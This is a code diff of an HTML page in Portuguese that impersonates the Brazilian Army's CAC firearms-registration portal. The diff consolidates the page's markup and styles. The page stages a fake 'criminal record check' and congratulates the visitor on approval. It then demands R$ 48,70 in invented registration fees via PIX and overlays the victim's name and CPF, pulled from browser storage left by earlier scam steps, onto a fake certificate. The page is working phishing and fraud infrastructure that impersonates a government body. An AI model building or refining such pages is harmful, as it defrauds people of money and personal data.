@@ -1,34 +1,29 @@
 <!DOCTYPE html>
 <html class="no-js no-touch" lang="pt-BR">
 
-
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="images/favicon.png" type="image/x-icon">
+    <title>Registro CAC</title>
 
+    <!-- Scripts Únicos -->
+    <script src="js/jquery-3.6.4.min.js"></script>
     <script src="js/JsBarcode.all.min.js"></script>
     <script src="js/qrcode.min.js"></script>
-    <script src="js/qrcode.min.js"></script>
-    <script src="js/jquery-3.6.4.min.js"></script>
     <script src="https://cdn.tailwindcss.com/"></script>
     <link rel="stylesheet" href="css/all.min_1.css" crossorigin="anonymous">
-    
-
-
+    <link rel="stylesheet" type="text/css" href="css/slick.css">
+    <script type="text/javascript" src="js/slick.min.js"></script>
 
     <style>
-        .cssinspector-current-popup.cssinspector-extension-elements {
+        .cssinspector-current-popup.cssinspector-extension-elements,
+        #progress,
+        #cssinspector-logo-wrapper,
+        #admin-bar-iframe {
             display: none;
         }
-        
-        #progress {
-            display: none;
-        }
-        
-        #cssinspector-logo-wrapper {
-            display: none;
-        }
-        
+
         @font-face {
             font-family: 'Proxima Nova';
             font-weight: 300;
@@ -36,7 +31,7 @@
             font-style: normal;
             src: url(fonts/proximanova-light.woff2) format("woff2"), url(fonts/proximanova-light.woff) format("woff"), url(fonts/proximanova-light.ttf) format("truetype")
         }
-        
+
         @font-face {
             font-family: 'Proxima Nova';
             font-weight: 400;
@@ -44,7 +39,7 @@
             font-style: normal;
             src: url(fonts/proximanova-regular.woff2) format("woff2"), url(fonts/proximanova-regular.woff) format("woff"), url(fonts/proximanova-regular.ttf) format("truetype")
         }
-        
+
         @font-face {
             font-family: 'Proxima Nova';
             font-weight: 600;
@@ -52,437 +47,280 @@
             font-style: normal;
             src: url(fonts/proximanova-semibold.woff2) format("woff2"), url(fonts/proximanova-semibold.woff) format("woff"), url(fonts/proximanova-semibold.ttf) format("truetype")
         }
-        
-    </style>
 
+        #finalizandoCEO {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
 
-    <script src="js/jquery-3.6.0.min.js"></script>
-    <style>
-        #admin-bar-iframe {
-            display: none;
+        #finalizandoCEO p {
+            color: white;
+            font-size: 24px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        @keyframes is-rotating {
+            to { transform: rotate(1turn); }
+        }
+
+        @keyframes border-pulse {
+            0%, 100% { border-top-color: #3483fa; border-right-color: transparent; border-bottom-color: transparent; border-left-color: transparent; }
+            25% { border-top-color: #3483fa; border-right-color: #3483fa; border-bottom-color: transparent; border-left-color: transparent; }
+            50% { border-top-color: #fff159; border-right-color: #fff159; border-bottom-color: #fff159; border-left-color: transparent; }
+            75% { border-top-color: #fff159; border-right-color: transparent; border-bottom-color: transparent; border-left-color: transparent; }
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+        }
+
+        @keyframes moveLeftRight {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(10px); }
+        }
+
+        .animate-left-right {
+            animation: moveLeftRight 2s infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e2e8f0;
+            border-top: 5px solid #166534;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes fadeOut {
+            0%, 90% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            pointer-events: none; /* ESSA LINHA RESOLVE O PROBLEMA: O clique passa por ela */
+        }
+
+        .fade-out {
+            animation: fadeOut 8s forwards;
+        }
+
+        .fixed-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1001;
+        }
+
+        #text-overlay-1, #text-overlay-2 {
+            color: #4a5568;
+            font-weight: bold;
+            position: absolute;
+        }
+
+        #text-overlay-1 {
+            font-size: 11.5px;
+            top: 32.5%;
+            left: 17.5%;
+        }
+
+        #text-overlay-2 {
+            font-size: 11.5px;
+            top: 42.5%;
+            left: 17.5%;
+        }
+
+        img {
+            width: 100%;
+            max-width: 700px;
+            height: auto;
         }
     </style>
-
-    <script src="js/qrcode.min.js"></script>
-    <!-- Other meta and title tags -->
-    <link rel="stylesheet" type="text/css" href="css/slick.css">
-    <script src="js/jquery-3.6.0.min.js"></script>
-
-
-
-    
-    
-<title> Registro CAC</title>
-    <script src="js/jquery-3.6.0.min.js"></script>
 </head>
 
-<body class="" id="bodytop1" style="">
-    
-    <iframe src="about:blank" title="" role="presentation" loading="eager" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe>
-    <link rel="stylesheet" type="text/css" href="css/slick.css">
-    <script type="text/javascript" src="js/slick.min.js"></script>
-    <script src="js/JsBarcode.all.min.js"></script>
+<body id="bodytop1">
 
+    <div id="finalizandoCEO" style="background-color: rgb(255, 255, 255); display: none;">
+        <div class="c-loader"></div>
+    </div>
 
+    <div id="loadingScreen" class="loading-screen fade-out">
+        <div class="spinner mb-8"></div>
+        <div id="loadingStatus" class="text-lg font-semibold text-green-800 mb-4">Verificando Histórico criminal</div>
+    </div>
 
+    <div class="fixed-header">
+        <header class="bg-green-800 text-white shadow-md">
+            <div class="container mx-auto px-4">
+                <div class="flex items-center justify-center h-14">
+                    <div class="flex items-center">
+                        <img alt="Brasão do Exército Brasileiro" class="mr-3 h-10 w-auto" src="../quiz%20etapa%203/images/favicon.png">
+                        <div>
+                            <div class="text-xs">Ministério da Defesa</div>
+                            <div class="font-bold text-sm">Exército Brasileiro</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+    </div>
 
+    <main class="container mx-auto px-4 py-10 mt-14">
+        <div class="bg-white shadow-lg rounded-lg overflow-hidden">
+            <div class="bg-green-700 text-white py-4 px-6">
+                <h1 class="text-2xl font-bold">Parabéns! Você foi aprovado no processo de Registro CAC</h1>
+            </div>
+            <div class="p-6">
+                <div class="mb-6">
+                    <p class="mb-3 text-base">Temos o prazer de informar que você foi aprovado nos testes para obtenção do Certificado de Registro de Colecionador, Atirador e Caçador (CAC). Seu certificado será enviado para o endereço cadastrado em até 30 dias.</p>
+                    <p class="mb-3 text-base">Para concluir o processo e receber seu certificado, é necessário efetuar o pagamento das taxas referentes ao registro CAC no Brasil.</p>
+                </div>
 
+                <div class="bg-gray-100 rounded-lg p-4 mb-6">
+                    <h2 class="text-lg font-semibold mb-3">As taxas incluem:</h2>
+                    <ul class="list-disc list-inside text-sm space-y-2">
+                        <li>Taxa de expedição de Certificado de Registro</li>
+                        <li>Guia de Tráfego para colecionador, atirador e caçador</li>
+                        <li>Taxa para aquisição de arma de fogo</li>
+                    </ul>
+                    <div class="mt-4 pt-4 border-t border-gray-300">
+                        <p class="text-2xl font-bold text-green-800 text-center">
+                            Valor Total: R$ 48,70
+                        </p>
+                        <p class="text-sm text-gray-600 text-center mt-1">Pagamento via PIX</p>
+                    </div>
+                </div>
 
-        <style>
-        #finalizandoCEO {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background-color: rgba(0, 0, 0, 0.5);
-                /* Cor de fundo com transparência */
-                z-index: 9999;
-                /* Garante que esteja acima de outros elementos */
-                display: flex;
-                flex-direction: column;
-                /* Alinhar os itens na direção da coluna */
-                justify-content: center;
-                align-items: center;
-            }
-            
-            #finalizandoCEO p {
-                color: white;
-                font-size: 24px;
-                text-align: center;
-                margin-top: 20px;
-                /* Espaçamento entre o loader e o texto */
-            }
-        }
-        @keyframes is-rotating {
-            to {
-                transform: rotate(1turn);
-            }
-        }
-        @keyframes border-pulse {
-            0%,
-            100% {
-                border-top-color: #3483fa;
-                border-right-color: transparent;
-                border-bottom-color: transparent;
-                border-left-color: transparent;
-            }
-            
-            25% {
-                border-top-color: #3483fa;
-                border-right-color: #3483fa;
-                border-bottom-color: transparent;
-                border-left-color: transparent;
-            }
-            
-            50% {
-                border-top-color: #fff159;
-                border-right-color: #fff159;
-                border-bottom-color: #fff159;
-                border-left-color: transparent;
-            }
-            
-            75% {
-                border-top-color: #fff159;
-                border-right-color: transparent;
-                border-bottom-color: transparent;
-                border-left-color: transparent;
-            }
-        }
-        </style>
+                <p class="mb-6 text-base">Gerando seu código PIX para pagamento...</p>
+                
+                <div id="pix-loading" class="text-center py-8">
+                    <div class="spinner mx-auto mb-4"></div>
+                    <p class="text-gray-600">Gerando código PIX...</p>
+                </div>
+                
+                <div id="pix-container" class="mb-6"></div>
+                
+                <div id="payment-button-container" class="flex justify-center" style="display: none;">
+                    <button id="paymentButton" onclick="gerarPix()" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-full text-base animate-left-right inline-flex items-center justify-center">
+                        <span>Gerar PIX para Pagamento</span>
+                        <i class="fas fa-arrow-right ml-2"></i>
+                    </button>
+                </div>
+            </div>
 
-
-        <!-- Elemento finalizando -->
-        <div id="finalizandoCEO" style="background-color: rgb(255, 255, 255); display: none;">
-            <div class="c-loader"></div>
-
+            <div class="relative mb-6">
+                <img src="documento.png" alt="Documento CAC" class="w-full h-auto max-w-lg mx-auto" />
+                <div id="text-overlay-1"></div>
+                <div id="text-overlay-2"></div>
+            </div>
         </div>
+    </main>
 
-
-        <script>
-            window.addEventListener('load', function() {
-                var finalizandoCEO = document.getElementById('finalizandoCEO');
-                finalizandoCEO.style.display = 'none';
-            });
-        </script>
-
-        <main id="main" style="">
-
-
-
-            <meta charset="utf-8">
-            <meta content="width=device-width, initial-scale=1.0" name="viewport">
-            <title>Exército Brasileiro - Aprovação do Registro CAC</title>
-            <link href="css/all.min.css" rel="stylesheet">
-            <style>
-                body {
-                    font-family: 'Poppins', sans-serif;
-                }
-                
-                @keyframes moveLeftRight {
-                    0%,
-                    100% {
-                        transform: translateX(0);
-                    }
-                    50% {
-                        transform: translateX(10px);
-                    }
-                }
-                
-                .animate-left-right {
-                    animation: moveLeftRight 2s infinite;
-                }
-                
-                @keyframes spin {
-                    0% {
-                        transform: rotate(0deg);
-                    }
-                    100% {
-                        transform: rotate(360deg);
-                    }
-                }
-                
-                .spinner {
-                    width: 50px;
-                    height: 50px;
-                    border: 5px solid #e2e8f0;
-                    border-top: 5px solid #166534;
-                    border-radius: 50%;
-                    animation: spin 1s linear infinite;
-                }
-                
-                @keyframes fadeOut {
-                    0% {
-                        opacity: 1;
-                    }
-                    90% {
-                        opacity: 1;
-                    }
-                    100% {
-                        opacity: 0;
-                    }
-                }
-                
-                .fade-out {
-                    animation: fadeOut 8s forwards;
-                }
-                
-                .loading-screen {
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 100%;
-                    background-color: white;
-                    display: flex;
-                    flex-direction: column;
-                    justify-content: center;
-                    align-items: center;
-                    z-index: 9999;
-                }
-                
-                .payment-overlay {
-                    position: fixed;
-                    top: 0;
-                    left: -100%;
-                    width: 100%;
-                    height: 100%;
-                    background-color: white;
-                    z-index: 1000;
-                    transition: left 0.5s ease-in-out;
-                }
-                
-                .payment-overlay.active {
-                    left: 0;
-                }
-                
-                .payment-iframe {
-                    margin-top: 40px;
-                    border: none;
-                    width: 100%;
-                    height: 100%;
-                    position: absolute;
-                    top: 0;
-                    left: 0;
-                    right: 0;
-                    bottom: 0;
-                    z-index: 1000;
-                }
-                
-                .fixed-header {
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    right: 0;
-                    z-index: 1001;
-                }
-            </style>
-
-
-            <div id="loadingScreen" class="loading-screen fade-out">
-                <div class="spinner mb-8"></div>
-                <div id="loadingStatus" class="text-lg font-semibold text-green-800 mb-4">Verificando Histórico criminal</div>
-            </div>
-
-            <div class="fixed-header">
-                <header class="bg-green-800 text-white shadow-md">
-                    <div class="container mx-auto px-4">
-                        <div class="flex items-center justify-center h-14">
-                            <div class="flex items-center">
-                                <img alt="Brasão do Exército Brasileiro" class="mr-3 h-10 w-auto" src="../quiz%20etapa%203/images/favicon.png">
-                                <div>
-                                    <div class="text-xs">Ministério da Defesa</div>
-                                    <div class="font-bold text-sm">Exército Brasileiro</div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </header>
-            </div>
-
-            <main class="container mx-auto px-4 py-10 mt-14">
-                <div class="bg-white shadow-lg rounded-lg overflow-hidden">
-                    <div class="bg-green-700 text-white py-4 px-6">
-                        <h1 class="text-2xl font-bold">Parabéns! Você foi aprovado no processo de Registro CAC</h1>
-                    </div>
-                    <div class="p-6">
-                        <div class="mb-6">
-                            <p class="mb-3 text-base">Temos o prazer de informar que você foi aprovado nos testes para obtenção do Certificado de Registro de Colecionador, Atirador e Caçador (CAC). Seu certificado será enviado para o endereço cadastrado em até 30 dias.</p>
-                            <p class="mb-3 text-base">Para concluir o processo e receber seu certificado, é necessário efetuar o pagamento das taxas referentes ao registro CAC no Brasil.</p>
-                        </div>
-
-
-
-                        <div class="bg-gray-100 rounded-lg p-4 mb-6">
-                            <h2 class="text-lg font-semibold mb-3">As taxas incluem:</h2>
-                            <ul class="list-disc list-inside text-sm space-y-2">
-                                <li>Taxa de expedição de Certificado de Registro</li>
-                                <li>Guia de Tráfego para colecionador, atirador e caçador</li>
-                                <li>Taxa para aquisição de arma de fogo</li>
-                            </ul>
-                            <div class="mt-4 pt-4 border-t border-gray-300">
-                                <p class="text-2xl font-bold text-green-800 text-center">
-                                    Valor Total: R$ 48,70
-                                </p>
-                                <p class="text-sm text-gray-600 text-center mt-1">Pagamento via PIX</p>
-                            </div>
-                        </div>
-
-                        <p class="mb-6 text-base">Gerando seu código PIX para pagamento...</p>
-                        
-                        <!-- Container para o PIX -->
-                        <div id="pix-loading" class="text-center py-8">
-                            <div class="spinner mx-auto mb-4"></div>
-                            <p class="text-gray-600">Gerando código PIX...</p>
-                        </div>
-                        
-                        <div id="pix-container" class="mb-6">
-                            <!-- O PIX será exibido aqui -->
-                        </div>
-                        
-                        <div id="payment-button-container" class="flex justify-center" style="display: none;">
-                            <button id="paymentButton" onclick="gerarPix()" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-full text-base animate-left-right inline-flex items-center justify-center">
-                                <span>Gerar PIX para Pagamento</span>
-                                <i class="fas fa-arrow-right ml-2"></i>
-                            </button>
-                        </div>
-
-                    </div>
-                    <!-- Seção com a imagem e textos sobrepostos -->
-                    <!-- Seção com a imagem e textos sobrepostos -->
-                    <div class="relative mb-6">
-                        <img src="documento.png" alt="Documento CAC" class="w-full h-auto max-w-lg mx-auto" />
-                        <div class="absolute top-1/4 left-1/4 text-gray-600 font-bold text-lg" id="text-overlay-1">
-                            <!-- O nome completo será injetado aqui -->
-                        </div>
-                        <div class="absolute top-1/2 left-1/4 text-gray-600 font-bold text-lg" id="text-overlay-2">
-                            <!-- O CPF será injetado aqui -->
-                        </div>
-                    </div>
-
-                    <script>
-                        document.addEventListener('DOMContentLoaded', function () {
-                            let addressData = {};
-                            try {
-                                addressData = JSON.parse(localStorage.getItem('data-drop2') || '{}');
-                            } catch (error) {
-                                addressData = {};
-                            }
-
-                            const name = localStorage.getItem('nome')
-                                || localStorage.getItem('nomeCompleto')
-                                || addressData.destinatario
-                                || '';
-                            const cpf = (localStorage.getItem('cpf')
-                                || localStorage.getItem('valorGuardado')
-                                || '').replace(/\D/g, '');
-
-                            const nameOverlay = document.getElementById('text-overlay-1');
-                            const cpfOverlay = document.getElementById('text-overlay-2');
-                            if (nameOverlay) nameOverlay.textContent = name;
-                            if (cpfOverlay) cpfOverlay.textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-                        });
-                    </script>
-
+    <footer class="bg-green-900 text-white py-8">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">O EXÉRCITO</h3>
+                    <ul class="space-y-2">
+                        <li><a class="hover:underline" href="#">Missão e Visão</a></li>
+                        <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
+                        <li><a class="hover:underline" href="#">Organização</a></li>
+                        <li><a class="hover:underline" href="#">História</a></li>
+                    </ul>
                 </div>
-            </main>
-
-
-            <style>
-                .relative {
-                    position: relative;
-                }
-                
-                .absolute {
-                    position: absolute;
-                }
-                
-                #text-overlay-1,
-                #text-overlay-2 {
-                    color: #4a5568;
-                    /* Cinza */
-                    font-weight: bold;
-                }
-                /* Ajustes para a posição dos textos */
-                
-                #text-overlay-1 {
-                    font-size: 11.5px;
-                    top: 32.5%;
-                    /* 25% da altura da imagem */
-                    left: 17.5%;
-                    /* 25% da largura da imagem */
-                }
-                
-                #text-overlay-2 {
-                    font-size: 11.5px;
-                    top: 42.5%;
-                    /* 50% da altura da imagem */
-                    left: 17.5%;
-                    /* 25% da largura da imagem */
-                }
-                /* Ajustável via CSS */
-                
-                img {
-                    width: 100%;
-                    /* Pode ajustar o tamanho da imagem aqui */
-                    max-width: 700px;
-                    /* Largura máxima */
-                    height: auto;
-                }
-            </style>
-
-
-            <footer class="bg-green-900 text-white py-8">
-                <div class="container mx-auto px-4">
-                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
-                        <div>
-                            <h3 class="font-bold mb-3 text-lg">O EXÉRCITO</h3>
-                            <ul class="space-y-2">
-                                <li><a class="hover:underline" href="#">Missão e Visão</a></li>
-                                <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
-                                <li><a class="hover:underline" href="#">Organização</a></li>
-                                <li><a class="hover:underline" href="#">História</a></li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h3 class="font-bold mb-3 text-lg">SERVIÇOS</h3>
-                            <ul class="space-y-2">
-                                <li><a class="hover:underline" href="#">CAC</a></li>
-                                <li><a class="hover:underline" href="#">Alistamento</a></li>
-                                <li><a class="hover:underline" href="#">Concursos</a></li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h3 class="font-bold mb-3 text-lg">TRANSPARÊNCIA</h3>
-                            <ul class="space-y-2">
-                                <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
-                                <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h3 class="font-bold mb-3 text-lg">CONTATO</h3>
-                            <ul class="space-y-2">
-                                <li><a class="hover:underline" href="#">Ouvidoria</a></li>
-                                <li><a class="hover:underline" href="#">Fale Conosco</a></li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h3 class="font-bold mb-3 text-lg">REDES SOCIAIS</h3>
-                            <div class="flex space-x-4">
-                                <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-facebook-f"></i></a>
-                                <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-instagram"></i></a>
-                                <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-twitter"></i></a>
-                                <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-youtube"></i></a>
-                            </div>
-                        </div>
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">SERVIÇOS</h3>
+                    <ul class="space-y-2">
+                        <li><a class="hover:underline" href="#">CAC</a></li>
+                        <li><a class="hover:underline" href="#">Alistamento</a></li>
+                        <li><a class="hover:underline" href="#">Consultas</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">TRANSPARÊNCIA</h3>
+                    <ul class="space-y-2">
+                        <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
+                        <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">CONTATO</h3>
+                    <ul class="space-y-2">
+                        <li><a class="hover:underline" href="#">Ouvidoria</a></li>
+                        <li><a class="hover:underline" href="#">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">REDES SOCIAIS</h3>
+                    <div class="flex space-x-4">
+                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-youtube"></i></a>
                     </div>
                 </div>
-            </footer>
-            <div class="bg-green-950 text-white text-sm py-3 text-center">
-                Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
             </div>
+        </div>
+    </footer>
+    <div class="bg-green-950 text-white text-sm py-3 text-center">
+        Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
+    </div>
 
-        </main>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            let addressData = {};
+            try {
+                addressData = JSON.parse(localStorage.getItem('data-drop2') || '{}');
+            } catch (error) {
+                addressData = {};
+            }
 
+            const name = localStorage.getItem('nome')
+                || localStorage.getItem('nomeCompleto')
+                || addressData.destinatario
+                || '';
+            const cpf = (localStorage.getItem('cpf')
+                || localStorage.getItem('valorGuardado')
+                || '').replace(/\D/g, '');
 
+            const nameOverlay = document.getElementById('text-overlay-1');
+            const cpfOverlay = document.getElementById('text-overlay-2');
+            if (nameOverlay) nameOverlay.textContent = name;
+            if (cpfOverlay) cpfOverlay.textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        });
+
+        window.addEventListener('load', function() {
+            var finalizandoCEO = document.getElementById('finalizandoCEO');
+            if(finalizandoCEO) finalizandoCEO.style.display = 'none';
+        });
+    </script>
     <script src="js/pix-payment.js?v=void-20260921"></script>
+</body>
+</html>
